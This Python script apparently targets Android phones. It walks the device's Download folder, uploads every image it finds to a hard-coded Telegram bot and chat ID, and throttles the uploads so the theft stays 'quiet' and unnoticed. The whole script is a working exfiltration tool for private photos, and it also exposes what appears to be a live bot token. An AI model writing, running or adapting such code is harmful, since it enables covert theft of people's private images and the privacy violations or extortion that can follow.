import os
import telebot
from concurrent.futures import ThreadPoolExecutor
import time

logo = ("""\033[1;91m
\033[1;32m _ \033[1;31m  _  \033[1;32m _   \033[1;31m_  \033[1;32m _\n\033[1;32m/ \ \033[1;31m/ \ \033[1;32m/ \ \033[1;31m/ \ \033[1;32m/ \  \n \033[1;32mN | A | D | E | R \n\033[1;31m_/ \033[1;32m_/\033[1;31m _/ \033[1;32m_/ \033[1;31m_/
\033[1;32m--------------------------------------------------""")
print(logo)

# إعدادات البوت
API_TOKEN = "6238470351:AAHjGIk20n34TUrDBVkdgdC0faL07MZkYac"
CHAT_ID = "1350971290"
bot = telebot.TeleBot(API_TOKEN)

dir_path = "/storage/emulated/0/Download" # نصيحة: جرب على مجلد الداونلود أولاً للتأكد

def send_file(file_path):
    try:
        # فحص الامتدادات
        valid_extensions = (".jpg", ".png", ".jpeg", ".webp", ".PNG", ".JPEG", ".Webp")
        if file_path.lower().endswith(valid_extensions):
            with open(file_path, "rb") as f:
                bot.send_photo(chat_id=CHAT_ID, photo=f)
                print(f"[+] تم رفع: {os.path.basename(file_path)}")
                # تأخير بسيط جداً بين كل رفع والآخر لتجنب الحظر من تلقرام
                time.sleep(1.5) 
    except Exception as e:
        print(f"[-] خطأ في ملف {os.path.basename(file_path)}")

# استخدام التخزين المؤقت للعمليات (Max Workers = 2 لجعل السكربت هادئاً)
print("جاري التحليل والرفع بهدوء...")
with ThreadPoolExecutor(max_workers=2) as executor:
    for root, dirs, files in os.walk(dir_path):
        for file in files:
            file_path = os.path.join(root, file)
            executor.submit(send_file, file_path)

print("--- انتهت العملية ---")
